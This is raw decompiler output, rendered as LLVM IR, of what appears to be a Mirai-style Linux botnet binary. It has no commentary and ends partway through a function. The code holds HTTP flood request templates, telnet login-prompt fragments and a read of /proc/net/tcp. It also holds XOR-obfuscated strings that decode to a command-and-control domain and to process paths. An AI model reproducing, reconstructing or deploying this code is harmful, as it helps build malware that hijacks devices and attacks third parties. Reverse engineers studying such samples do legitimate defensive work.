source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%tms = type { i32, i32, i32, i32 }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%stat = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%linux_dirent64 = type { i32 }

@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_80567b0.2 = global i32 0
@global_var_80567c8.3 = local_unnamed_addr global i32* @global_var_80567b0.2
@global_var_8054ab4.5 = constant [4 x i8] c"GET\00"
@global_var_8054a8d.6 = constant i32 1210056751
@global_var_8054abf.7 = constant i32 540737568
@global_var_8054a8f.8 = constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00"
@global_var_8054aa7.9 = constant [9 x i8] c"\0D\0AHost: \00"
@global_var_8054ac6.10 = constant [3 x i8] c"\0D\0A\00"
@global_var_8054ab8.11 = constant [9 x i8] c"Cookie: \00"
@global_var_8054ac1.12 = constant [3 x i8] c"; \00"
@global_var_8054ac4.13 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_8054ac9.14 = constant i32 1952972859
@global_var_8054acb.15 = constant [5 x i8] c"http\00"
@global_var_8054ada.16 = constant i32 -1623588825
@global_var_8054ad0.17 = constant [5 x i8] c"url=\00"
@global_var_8054ad5.18 = constant [5 x i8] c"POST\00"
@global_var_8054ad3.19 = constant i32 1330643005
@global_var_8054af0.20 = constant [14 x i8] c"/proc/net/tcp\00"
@global_var_8056924.21 = local_unnamed_addr global i32 0
@global_var_8056920.22 = local_unnamed_addr global i32 0
@global_var_80568a0.23 = local_unnamed_addr global i32 0
@global_var_80567d4.24 = local_unnamed_addr global i32 134553184
@global_var_80567cc.25 = local_unnamed_addr global i32 -1
@global_var_805691c.27 = local_unnamed_addr global i32 0
@global_var_805692c.28 = local_unnamed_addr global i32 0
@global_var_805692a.29 = local_unnamed_addr global i32 0
@global_var_80568a8.30 = local_unnamed_addr global i32 0
@global_var_80568b4.31 = local_unnamed_addr global i32 0
@global_var_80568ac.32 = local_unnamed_addr global i32 0
@global_var_80568b0.33 = local_unnamed_addr global i32 0
@global_var_80568f0.34 = local_unnamed_addr global i32 0
@global_var_80568ca.35 = local_unnamed_addr global i32 0
@global_var_80568d0.36 = local_unnamed_addr global i32 0
@global_var_80568c0.37 = global i32 0
@global_var_80568d8.39 = local_unnamed_addr global i32 0
@global_var_80568e4.40 = local_unnamed_addr global i32 0
@global_var_80568d4.41 = global i32 0
@global_var_805693c.42 = local_unnamed_addr global i32 0
@global_var_80568c4.43 = local_unnamed_addr global i32 0
@global_var_80568cc.44 = local_unnamed_addr global i32 0
@global_var_8056938.45 = local_unnamed_addr global i32 0
@global_var_8054cc5.46 = constant [5 x i8] c"ogin\00"
@global_var_8054cca.47 = constant [6 x i8] c"enter\00"
@global_var_8054cd0.48 = constant [8 x i8] c"assword\00"
@global_var_80568b8.50 = local_unnamed_addr global i32 0
@global_var_80568e8.51 = local_unnamed_addr global i32 0
@global_var_8056960.52 = global i32 0
@global_var_8054d04.54 = constant [27 x i8] c"ALA\0CQRMMI[JCAIGP@MVLGV\0CON\22\00"
@global_var_8056978.55 = local_unnamed_addr global i32 0
@global_var_805697c.56 = local_unnamed_addr global i32 0
@global_var_8054d1f.57 = constant [3 x i8] c"\225\00"
@global_var_8056980.58 = local_unnamed_addr global i32 0
@global_var_8056984.59 = local_unnamed_addr global i32 0
@global_var_80569f0.60 = local_unnamed_addr global i32 0
@global_var_80569f4.61 = local_unnamed_addr global i32 0
@global_var_8054d22.62 = constant i32 1308673945
@global_var_80569f8.63 = local_unnamed_addr global i32 0
@global_var_80569fc.64 = local_unnamed_addr global i32 0
@global_var_8054d25.65 = constant i32 1448168270
@global_var_8056970.66 = local_unnamed_addr global i32 0
@global_var_8056974.67 = local_unnamed_addr global i32 0
@global_var_8054d35.68 = constant i32 1381389898
@global_var_8056988.69 = local_unnamed_addr global i32 0
@global_var_805698c.70 = local_unnamed_addr global i32 0
@global_var_8054d53.71 = constant [8 x i8] c"\0DRPMA\0D\22\00"
@global_var_8056990.72 = local_unnamed_addr global i32 0
@global_var_8056994.73 = local_unnamed_addr global i32 0
@global_var_8054d5b.74 = constant [6 x i8] c"\0DGZG\22\00"
@global_var_8056998.75 = local_unnamed_addr global i32 0
@global_var_805699c.76 = local_unnamed_addr global i32 0
@global_var_8054d61.77 = constant i32 1195772418
@global_var_80569a0.78 = local_unnamed_addr global i32 0
@global_var_80569a4.79 = local_unnamed_addr global i32 0
@global_var_8054d6d.80 = constant [5 x i8] c"\0DDF\22\00"
@global_var_80569a8.81 = local_unnamed_addr global i32 0
@global_var_80569ac.82 = local_unnamed_addr global i32 0
@global_var_8054d72.83 = constant [8 x i8] c"\0CCLKOG\22\00"
@global_var_80569b0.84 = local_unnamed_addr global i32 0
@global_var_80569b4.85 = local_unnamed_addr global i32 0
@global_var_8054d7a.86 = constant [9 x i8] c"\0DQVCVWQ\22\00"
@global_var_80569b8.87 = local_unnamed_addr global i32 0
@global_var_80569bc.88 = local_unnamed_addr global i32 0
@global_var_8054d83.89 = constant i32 1836214128
@global_var_80569c0.90 = local_unnamed_addr global i32 0
@global_var_80569c4.91 = local_unnamed_addr global i32 0
@global_var_8054d91.92 = constant [11 x i8] c"jvvrdnmmf\22\00"
@global_var_80569c8.93 = local_unnamed_addr global i32 0
@global_var_80569cc.94 = local_unnamed_addr global i32 0
@global_var_8054d9c.95 = constant [11 x i8] c"nmnlmevdm\22\00"
@global_var_80569d0.96 = local_unnamed_addr global i32 0
@global_var_80569d4.97 = local_unnamed_addr global i32 0
@global_var_8054f1c.98 = constant i32 437738110
@global_var_80569d8.99 = local_unnamed_addr global i32 0
@global_var_80569dc.100 = local_unnamed_addr global i32 0
@global_var_8054da7.101 = constant [9 x i8] c"XMNNCPF\22\00"
@global_var_80569e0.102 = local_unnamed_addr global i32 0
@global_var_80569e4.103 = local_unnamed_addr global i32 0
@global_var_8054db0.104 = constant [12 x i8] c"egvnmacnkr\22\00"
@global_var_80569e8.105 = local_unnamed_addr global i32 0
@global_var_80569ec.106 = local_unnamed_addr global i32 0
@global_var_8054dbc.107 = constant [7 x i8] c"QJGNN\22\00"
@global_var_8056a00.108 = local_unnamed_addr global i32 0
@global_var_8056a04.109 = local_unnamed_addr global i32 0
@global_var_8054dc3.110 = constant [8 x i8] c"GLC@NG\22\00"
@global_var_8056a08.111 = local_unnamed_addr global i32 0
@global_var_8056a0c.112 = local_unnamed_addr global i32 0
@global_var_8054dcb.113 = constant [8 x i8] c"Q[QVGO\22\00"
@global_var_8056a10.114 = local_unnamed_addr global i32 0
@global_var_8056a14.115 = local_unnamed_addr global i32 0
@global_var_8054dd3.116 = constant [4 x i8] c"QJ\22\00"
@global_var_8056a18.117 = local_unnamed_addr global i32 0
@global_var_8056a1c.118 = local_unnamed_addr global i32 0
@global_var_8054dd7.119 = constant i32 1280000013
@global_var_8056a20.120 = local_unnamed_addr global i32 0
@global_var_8056a24.121 = local_unnamed_addr global i32 0
@global_var_8054deb.122 = constant i32 1668311919
@global_var_8056a28.123 = local_unnamed_addr global i32 0
@global_var_8056a2c.124 = local_unnamed_addr global i32 0
@global_var_8054e04.125 = constant [10 x i8] c"LAMPPGAV\22\00"
@global_var_8056a30.126 = local_unnamed_addr global i32 0
@global_var_8056a34.127 = local_unnamed_addr global i32 0
@global_var_8054e0e.128 = constant i32 1280000013
@global_var_8056a38.129 = local_unnamed_addr global i32 0
@global_var_8056a3c.130 = local_unnamed_addr global i32 0
@global_var_8054e1f.131 = constant i32 1280000013
@global_var_8056a40.132 = local_unnamed_addr global i32 0
@global_var_8056a44.133 = local_unnamed_addr global i32 0
@global_var_8054e36.134 = constant i32 1464693110
@global_var_8056a48.135 = local_unnamed_addr global i32 0
@global_var_8056a4c.136 = local_unnamed_addr global i32 0
@global_var_8054e4c.137 = constant [18 x i8] c"\0DGVA\0DPGQMNT\0CAMLD\22\00"
@global_var_8056a50.138 = local_unnamed_addr global i32 0
@global_var_8056a54.139 = local_unnamed_addr global i32 0
@global_var_8054e5e.140 = constant i32 1196376908
@global_var_8056a58.141 = local_unnamed_addr global i32 0
@global_var_8056a5c.142 = local_unnamed_addr global i32 0
@global_var_8054e6b.143 = constant i32 1280068961
@global_var_8056a60.144 = local_unnamed_addr global i32 0
@global_var_8056a64.145 = local_unnamed_addr global i32 0
@global_var_8054f40.146 = constant i32 1195458915
@global_var_8056a68.147 = local_unnamed_addr global i32 0
@global_var_8056a6c.148 = local_unnamed_addr global i32 0
@global_var_8054f94.149 = constant i32 1195458915
@global_var_8056a70.150 = local_unnamed_addr global i32 0
@global_var_8056a74.151 = local_unnamed_addr global i32 0
@global_var_8054fb8.152 = constant i32 1447841121
@global_var_8056a78.153 = local_unnamed_addr global i32 0
@global_var_8056a7c.154 = local_unnamed_addr global i32 0
@global_var_8054e83.155 = constant i32 1633044305
@global_var_8056a80.156 = local_unnamed_addr global i32 0
@global_var_8056a84.157 = local_unnamed_addr global i32 0
@global_var_8054e90.158 = constant i32 1346651984
@global_var_8056a88.159 = local_unnamed_addr global i32 0
@global_var_8056a8c.160 = local_unnamed_addr global i32 0
@global_var_8054e9a.161 = constant i32 1128353102
@global_var_8056a90.162 = local_unnamed_addr global i32 0
@global_var_8056a94.163 = local_unnamed_addr global i32 0
@global_var_8054ea5.164 = constant i32 257312593
@global_var_8056a98.165 = local_unnamed_addr global i32 0
@global_var_8056a9c.166 = local_unnamed_addr global i32 0
@global_var_8054eb2.167 = constant i32 1447841089
@global_var_8056aa0.168 = local_unnamed_addr global i32 0
@global_var_8056aa4.169 = local_unnamed_addr global i32 0
@global_var_8054ec3.170 = constant i32 1279479894
@global_var_8056aa8.171 = local_unnamed_addr global i32 0
@global_var_8056aac.172 = local_unnamed_addr global i32 0
@global_var_8054ed7.173 = constant [9 x i8] c"AJWLIGF\22\00"
@global_var_8056ab0.174 = local_unnamed_addr global i32 0
@global_var_8056ab4.175 = local_unnamed_addr global i32 0
@global_var_8054e77.176 = constant i32 1380403017
@global_var_8056ab8.177 = local_unnamed_addr global i32 0
@global_var_8056abc.178 = local_unnamed_addr global i32 0
@global_var_8054ee0.179 = constant i32 1280068929
@global_var_8056ac0.180 = local_unnamed_addr global i32 0
@global_var_8056ac4.181 = local_unnamed_addr global i32 0
@global_var_8054eed.182 = constant i32 1414547281
@global_var_8056ac8.183 = local_unnamed_addr global i32 0
@global_var_8056acc.184 = local_unnamed_addr global i32 0
@global_var_8054f00.185 = constant i32 1414547281
@global_var_8056ad0.186 = local_unnamed_addr global i32 0
@global_var_8056ad4.187 = local_unnamed_addr global i32 0
@global_var_8054fec.188 = constant i32 1264078191
@global_var_8056ad8.189 = local_unnamed_addr global i32 0
@global_var_8056adc.190 = local_unnamed_addr global i32 0
@global_var_805505c.191 = constant i32 1264078191
@global_var_8056ae0.192 = local_unnamed_addr global i32 0
@global_var_8056ae4.193 = local_unnamed_addr global i32 0
@global_var_80550cc.194 = constant i32 1264078191
@global_var_8056ae8.195 = local_unnamed_addr global i32 0
@global_var_8056aec.196 = local_unnamed_addr global i32 0
@global_var_805513c.197 = constant i32 1264078191
@global_var_8056af0.198 = local_unnamed_addr global i32 0
@global_var_8056af4.199 = local_unnamed_addr global i32 0
@global_var_80551ac.200 = constant i32 1264078191
@global_var_8056af8.201 = local_unnamed_addr global i32 0
@global_var_8056afc.202 = local_unnamed_addr global i32 0
@global_var_8056914.203 = global i32 0
@global_var_8056b00.204 = global i32 0
@global_var_80567e0.205 = global i32 0
@global_var_8056bac.207 = global i32 0
@global_var_8056bb0.208 = local_unnamed_addr global i32 0
@global_var_8056bb4.209 = global i32 0
@global_var_8056bc0.210 = local_unnamed_addr global i32 0
@global_var_8056eb4.211 = global i32 0
@global_var_8056edc.212 = local_unnamed_addr global i32 0
@global_var_8056ecc.213 = local_unnamed_addr global i32 0
@global_var_8056ed0.214 = local_unnamed_addr global i32 0
@global_var_8056ed4.215 = local_unnamed_addr global i32 0
@global_var_8056ed8.216 = local_unnamed_addr global i32 0
@global_var_8056ee4.217 = local_unnamed_addr global i32 0
@global_var_8056ef0.218 = local_unnamed_addr global i32 0
@global_var_8056ee8.219 = local_unnamed_addr global i32 0
@global_var_8056ef4.220 = local_unnamed_addr global i32 0
@global_var_8056ec8.221 = local_unnamed_addr global i32 0
@global_var_8056ec4.223 = local_unnamed_addr global i32 0
@global_var_8056eec.224 = local_unnamed_addr global i32 0
@global_var_8056bbc.225 = local_unnamed_addr global i32 0
@global_var_80567f8.226 = global i32 0
@global_var_80555a0.228 = constant i32 33554944
@global_var_805682c.229 = local_unnamed_addr global i32* @global_var_80555a0.228
@global_var_8056810.230 = global i32 0
@global_var_80568f8.231 = local_unnamed_addr global i32 0
@global_var_80567a4.233 = global i32 -1
@global_var_8054029.234 = constant i32 -294069
@global_var_8056908.235 = local_unnamed_addr global i32 0
@global_var_805690c.236 = local_unnamed_addr global i32 0
@global_var_805547c.237 = constant [10 x i8] c"/dev/null\00"
@global_var_8056904.239 = local_unnamed_addr global i32 0
@global_var_80568fc.240 = local_unnamed_addr global i32 0
@global_var_8056900.241 = local_unnamed_addr global i32 0
@global_var_8054ac8.242 = constant i32 1744845568
@global_var_8056828.243 = local_unnamed_addr global i32* @global_var_8054ac8.242
@global_var_805420f.244 = constant i32 1928542531
@global_var_8054233.245 = constant i32 1928542531
@global_var_8056918.246 = local_unnamed_addr global i32 0
@global_var_8056ef8.247 = local_unnamed_addr global i32 0
@global_var_8056efc.248 = local_unnamed_addr global i32 0
@global_var_8056840.1 = local_unnamed_addr global i8 0
@global_var_80567d8.26 = local_unnamed_addr global i8 1
@global_var_80568d6.38 = local_unnamed_addr global i16 0
@global_var_80568ec.49 = local_unnamed_addr global i16 0
@global_var_80567dc.53 = local_unnamed_addr global i16 -16657
@global_var_8056b80.206 = global i8 0
@global_var_8056ee0.222 = local_unnamed_addr global i8 0
@global_var_80568f4.227 = local_unnamed_addr global i8 0
@global_var_8056910.238 = local_unnamed_addr global i8 0

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_8048094() local_unnamed_addr {
entry:
  %v0_8048097 = load i32, i32* @ebx, align 4
  %v1_8048098 = call i32 @function_80480b0(i32 %v0_8048097)
  %v0_804809d = load i32, i32* @ebx, align 4
  %v1_804809d = add i32 %v0_804809d, 59163
  store i32 %v1_804809d, i32* @ebx, align 4
  %v0_80480a3 = call i32 @function_8048110()
  %v0_80480a8 = call i32 @function_8054a30()
  ret i32 %v0_80480a8
}

define i32 @function_80480b0(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @ebx, align 4
  %v0_80480b3 = load i32, i32* @eax, align 4
  ret i32 %v0_80480b3
}

define i32 @function_80480c0() local_unnamed_addr {
dec_label_pc_80480c0:
  %v0_80480c6 = load i8, i8* @global_var_8056840.1, align 64
  %v1_80480c6 = icmp eq i8 %v0_80480c6, 0
  br i1 %v1_80480c6, label %dec_label_pc_80480db.preheader, label %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge

dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge: ; preds = %dec_label_pc_80480c0
  %v0_8048107.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8048106

dec_label_pc_80480db.preheader:                   ; preds = %dec_label_pc_80480c0
  %v0_80480db1 = load i32, i32* bitcast (i32** @global_var_80567c8.3 to i32*), align 8
  %v1_80480e22 = icmp eq i32 %v0_80480db1, 0
  %v1_80480e44 = icmp eq i1 %v1_80480e22, false
  br i1 %v1_80480e44, label %dec_label_pc_80480d1.lr.ph, label %dec_label_pc_80480e6

dec_label_pc_80480d1.lr.ph:                       ; preds = %dec_label_pc_80480db.preheader
  br label %dec_label_pc_80480d1

dec_label_pc_80480d1:                             ; preds = %dec_label_pc_80480d1.lr.ph, %dec_label_pc_80480d1
  %v0_80480d1 = phi i32 [ %v0_80480db1, %dec_label_pc_80480d1.lr.ph ], [ %v0_80480db, %dec_label_pc_80480d1 ]
  %v1_80480d1 = add i32 %v0_80480d1, 4
  store i32 %v1_80480d1, i32* bitcast (i32** @global_var_80567c8.3 to i32*), align 8
  call void @__pseudo_call(i32 %v0_80480d1)
  %v0_80480db = load i32, i32* bitcast (i32** @global_var_80567c8.3 to i32*), align 8
  %v1_80480e2 = icmp eq i32 %v0_80480db, 0
  %v1_80480e4 = icmp eq i1 %v1_80480e2, false
  br i1 %v1_80480e4, label %dec_label_pc_80480d1, label %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge

dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge: ; preds = %dec_label_pc_80480d1
  br label %dec_label_pc_80480e6

dec_label_pc_80480e6:                             ; preds = %dec_label_pc_80480db.dec_label_pc_80480e6_crit_edge, %dec_label_pc_80480db.preheader
  store i8 1, i8* @global_var_8056840.1, align 64
  br label %dec_label_pc_8048106

dec_label_pc_8048106:                             ; preds = %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge, %dec_label_pc_80480e6
  %v0_8048107 = phi i32 [ %v0_8048107.pre, %dec_label_pc_80480c0.dec_label_pc_8048106_crit_edge ], [ 0, %dec_label_pc_80480e6 ]
  ret i32 %v0_8048107

; uselistorder directives
  uselistorder i32 %v0_80480db, { 1, 0 }
  uselistorder i32 %v0_80480d1, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_80567c8.3 to i32*), { 1, 2, 0 }
  uselistorder i8* @global_var_8056840.1, { 1, 0 }
  uselistorder label %dec_label_pc_8048106, { 1, 0 }
  uselistorder label %dec_label_pc_80480d1, { 1, 0 }
}

define i32 @function_8048110() local_unnamed_addr {
dec_label_pc_8048110:
  %stack_var_-4 = alloca i32, align 4
  %v0_8048110 = load i32, i32* @ebp, align 4
  store i32 %v0_8048110, i32* %stack_var_-4, align 4
  %v4_8048110 = ptrtoint i32* %stack_var_-4 to i32
  store i32 0, i32* @eax, align 4
  store i32 %v4_8048110, i32* @ebp, align 4
  %v0_804811b = call i32 @function_8048120()
  ret i32 %v0_804811b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @function_8048120() local_unnamed_addr {
dec_label_pc_8048120:
  %v0_8048127 = load i32, i32* @eax, align 4
  %v1_8048127 = icmp eq i32 %v0_8048127, 0
  br i1 %v1_8048127, label %dec_label_pc_8048140, label %dec_label_pc_804812b

dec_label_pc_804812b:                             ; preds = %dec_label_pc_8048120
  %v1_8048138 = call i32 @unknown_0(i32 134567840)
  br label %dec_label_pc_8048140

dec_label_pc_8048140:                             ; preds = %dec_label_pc_8048120, %dec_label_pc_804812b
  %v0_8048140 = load i32, i32* inttoptr (i32 134571956 to i32*), align 4
  %v1_8048145 = icmp eq i32 %v0_8048140, 0
  br i1 %v1_8048145, label %dec_label_pc_804815f, label %dec_label_pc_8048149

dec_label_pc_8048149:                             ; preds = %dec_label_pc_8048140
  br label %dec_label_pc_804815f

dec_label_pc_804815f:                             ; preds = %dec_label_pc_8048149, %dec_label_pc_8048140
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_8048140, { 1, 0 }
}

define i32 @entry_point(i8 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20900 = alloca i8*, align 4
  %stack_var_-344 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-20825 = alloca i32, align 4
  %stack_var_-20972 = alloca i32, align 4
  %stack_var_-20956 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v3_8048166 = sext i8 %arg1 to i32
  store i32 %v3_8048166, i32* @esi, align 4
  %v5_8048166 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v5_8048166, i32* %ecx.global-to-local, align 4
  %v2_8048169 = icmp ult i32* %stack_var_4, inttoptr (i32 16 to i32*)
  store i1 %v2_8048169, i1* %zf.global-to-local, align 1
  %v0_804816c = load i32, i32* @eax, align 4
  store i32 %v0_804816c, i32* %stack_var_-4, align 4
  %v4_804816c = ptrtoint i32* %stack_var_-4 to i32
  %v0_804816e = load i32, i32* @edx, align 4
  %v10_8048180 = inttoptr i32 %v3_8048166 to i32*
  %v11_8048180 = call i32 @function_80540c5(i32 134538624, i32* %v10_8048180, i32 %v5_8048166, i32 -108, i32 134564438, i32 %v0_804816e, i32 %v4_804816c, i32 %v0_804816c)
  %v0_8048191 = load i32, i32* @edi, align 4
  %v0_8048192 = load i32, i32* @esi, align 4
  %v0_8048193 = load i32, i32* @ebx, align 4
  %v15_8048194 = ptrtoint i32* %stack_var_-20956 to i32
  store i32 134564438, i32* @ebx, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  store i32 148, i32* %eax.global-to-local, align 4
  store i32 %v3_8048166, i32* @ebp, align 4
  store i32 148, i32* @esi, align 4
  store i32 148, i32* %stack_var_-20972, align 4
  %v5_80481bd = call i32 @function_804a0a0(i8 -108, i32 134564438, i32 21, i32 0)
  store i32 %v5_80481bd, i32* %eax.global-to-local, align 4
  %v0_80481cd = load i32, i32* @ebx, align 4
  %v0_80481ce = load i32, i32* @esi, align 4
  %v5_80481cf = trunc i32 %v0_80481ce to i8
  %v6_80481cf = call i32 @function_804a0a0(i8 %v5_80481cf, i32 %v0_80481cd, i32 20, i32 ptrtoint ([4 x i8]* @global_var_8054ab4.5 to i32))
  store i32 %v6_80481cf, i32* %eax.global-to-local, align 4
  %tmp135 = bitcast i8** %stack_var_-20900 to i32*
  store i32 %v6_80481cf, i32* %tmp135, align 4
  %v0_80481d8 = load i32, i32* @esp, align 4
  %v6_80481d8 = icmp eq i32 %v0_80481d8, -32
  store i1 %v6_80481d8, i1* %zf.global-to-local, align 1
  %v0_80481df = load i32, i32* @ebx, align 4
  %v0_80481e0 = load i32, i32* @esi, align 4
  store i32 %v0_80481e0, i32* %stack_var_-20972, align 4
  %v4_80481e1 = trunc i32 %v0_80481e0 to i8
  %v5_80481e1 = call i32 @function_804a0a0(i8 %v4_80481e1, i32 %v0_80481df, i32 8, i32 0)
  store i32 %v5_80481e1, i32* %eax.global-to-local, align 4
  %v0_80481f1 = load i32, i32* @ebx, align 4
  %v0_80481f2 = load i32, i32* @esi, align 4
  %v5_80481f3 = trunc i32 %v0_80481f2 to i8
  %v6_80481f3 = call i32 @function_804a0a0(i8 %v5_80481f3, i32 %v0_80481f1, i32 22, i32 ptrtoint (i32* @global_var_8054a8d.6 to i32))
  store i32 %v6_80481f3, i32* @eax, align 4
  %v0_80481fc = load i32, i32* @esp, align 4
  %v6_80481fc = icmp eq i32 %v0_80481fc, -32
  store i1 %v6_80481fc, i1* %zf.global-to-local, align 1
  %v0_8048203 = load i32, i32* @ebx, align 4
  %v0_8048204 = load i32, i32* @esi, align 4
  store i32 %v0_8048204, i32* %stack_var_-20972, align 4
  %v4_8048205 = trunc i32 %v0_8048204 to i8
  %v5_8048205 = call i32 @function_804a600(i8 %v4_8048205, i32 %v0_8048203, i32 24, i32 1)
  store i32 %v5_8048205, i32* @eax, align 4
  store i32 %v5_8048205, i32* @edi, align 4
  %v0_8048210 = load i32, i32* @ebx, align 4
  %v0_8048211 = load i32, i32* @esi, align 4
  %v5_8048212 = trunc i32 %v0_8048211 to i8
  %v6_8048212 = call i32 @function_804a600(i8 %v5_8048212, i32 %v0_8048210, i32 7, i32 80)
  store i32 %v6_8048212, i32* %eax.global-to-local, align 4
  %v0_804821c = load i32, i32* @esp, align 4
  %v9_804821c = icmp eq i32 %v0_804821c, -28
  store i1 %v9_804821c, i1* %zf.global-to-local, align 1
  %v2_8048226 = ptrtoint i32* %stack_var_-20825 to i32
  store i32 %v2_8048226, i32* %edx.global-to-local, align 4
  store i32 %v2_8048226, i32* %stack_var_-20972, align 4
  %v3_804822e = bitcast i32* %stack_var_-20825 to i8*
  %v4_804822e = call i32 @function_805271a(i8* %v3_804822e, i32 0, i32 10241)
  store i32 %v4_804822e, i32* %eax.global-to-local, align 4
  store i32 %v5_80481e1, i32* %ecx.global-to-local, align 4
  %v1_804823a = icmp eq i32 %v5_80481e1, 0
  store i1 %v1_804823a, i1* %zf.global-to-local, align 1
  %tmp237 = inttoptr i32 %v6_80481cf to i8*
  br i1 %v1_804823a, label %dec_label_pc_804825d, label %dec_label_pc_804823e

dec_label_pc_804823e:                             ; preds = %entry
  store i32 %v6_80481f3, i32* %edx.global-to-local, align 4
  %v1_8048242 = icmp eq i32 %v6_80481f3, 0
  store i1 %v1_8048242, i1* %zf.global-to-local, align 1
  br i1 %v1_8048242, label %dec_label_pc_804825d, label %dec_label_pc_8048246

dec_label_pc_8048246:                             ; preds = %dec_label_pc_804823e
  %v9_8048246 = icmp eq i32* %stack_var_-20956, inttoptr (i32 12 to i32*)
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 %v6_80481f3, i32* %eax.global-to-local, align 4
  store i32 %v6_80481f3, i32* %stack_var_-20972, align 4
  %v1_804824e = inttoptr i32 %v6_80481f3 to i8*
  %v2_804824e = call i32 @function_8051bf0(i8* %v1_804824e)
  store i32 %v2_804824e, i32* %eax.global-to-local, align 4
  %v10_8048256 = icmp eq i32 %v2_804824e, 255
  store i1 %v10_8048256, i1* %zf.global-to-local, align 1
  %v7_804825b = icmp sgt i32 %v2_804824e, 255
  br i1 %v7_804825b, label %dec_label_pc_804825d, label %dec_label_pc_8048268

dec_label_pc_804825d:                             ; preds = %dec_label_pc_8048246, %dec_label_pc_804827d, %dec_label_pc_8048268, %dec_label_pc_804823e, %entry
  %v0_8048267 = phi i32 [ %v2_804824e, %dec_label_pc_8048246 ], [ %v2_8048285, %dec_label_pc_804827d ], [ %v2_8048270, %dec_label_pc_8048268 ], [ %v4_804822e, %dec_label_pc_804823e ], [ %v4_804822e, %entry ]
  %v9_804825d = icmp eq i32* %stack_var_-20956, inttoptr (i32 -20908 to i32*)
  store i1 %v9_804825d, i1* %zf.global-to-local, align 1
  store i32 %v0_8048193, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %v0_8048192, 16777216
  %v3_8048264 = sdiv i32 %sext, 16777216
  store i32 %v3_8048264, i32* %esi.global-to-local, align 4
  store i32 %v0_8048191, i32* %edi.global-to-local, align 4
  ret i32 %v0_8048267

dec_label_pc_8048268:                             ; preds = %dec_label_pc_8048246
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 %v5_80481e1, i32* %eax.global-to-local, align 4
  store i32 %v5_80481e1, i32* %stack_var_-20972, align 4
  %v1_8048270 = inttoptr i32 %v5_80481e1 to i8*
  %v2_8048270 = call i32 @function_8051bf0(i8* %v1_8048270)
  store i32 %v2_8048270, i32* %eax.global-to-local, align 4
  %v1_8048278 = add i32 %v2_8048270, -127
  %v6_8048278 = sub i32 126, %v2_8048270
  %v7_8048278 = and i32 %v6_8048278, %v2_8048270
  %v8_8048278 = icmp slt i32 %v7_8048278, 0
  %v9_8048278 = icmp eq i32 %v1_8048278, 0
  store i1 %v9_8048278, i1* %zf.global-to-local, align 1
  %v10_8048278 = icmp slt i32 %v1_8048278, 0
  %v3_804827b = icmp eq i1 %v10_8048278, %v8_8048278
  %v4_804827b = icmp eq i1 %v9_8048278, false
  %v5_804827b = and i1 %v4_804827b, %v3_804827b
  br i1 %v5_804827b, label %dec_label_pc_804825d, label %dec_label_pc_804827d

dec_label_pc_804827d:                             ; preds = %dec_label_pc_8048268
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 %v6_80481cf, i32* %eax.global-to-local, align 4
  store i32 %v6_80481cf, i32* %stack_var_-20972, align 4
  %v2_8048285 = call i32 @function_8051bf0(i8* %tmp237)
  store i32 %v2_8048285, i32* %eax.global-to-local, align 4
  %v1_804828d = add i32 %v2_8048285, -9
  %v6_804828d = sub i32 8, %v2_8048285
  %v7_804828d = and i32 %v6_804828d, %v2_8048285
  %v8_804828d = icmp slt i32 %v7_804828d, 0
  %v9_804828d = icmp eq i32 %v1_804828d, 0
  store i1 %v9_804828d, i1* %zf.global-to-local, align 1
  %v10_804828d = icmp slt i32 %v1_804828d, 0
  %v3_8048290 = icmp eq i1 %v10_804828d, %v8_804828d
  %v4_8048290 = icmp eq i1 %v9_804828d, false
  %v5_8048290 = and i1 %v4_8048290, %v3_8048290
  br i1 %v5_8048290, label %dec_label_pc_804825d, label %dec_label_pc_804829d.preheader

dec_label_pc_804829d.preheader:                   ; preds = %dec_label_pc_804827d
  store i1 %v9_8048246, i1* %zf.global-to-local, align 1
  store i32 %v6_80481cf, i32* %eax.global-to-local, align 4
  store i32 %v6_80481cf, i32* %stack_var_-20972, align 4
  %v2_80482a5211 = call i32 @function_8051bf0(i8* %tmp237)
  store i32 %v2_80482a5211, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v12_80482b4212 = icmp eq i32 %v2_80482a5211, 0
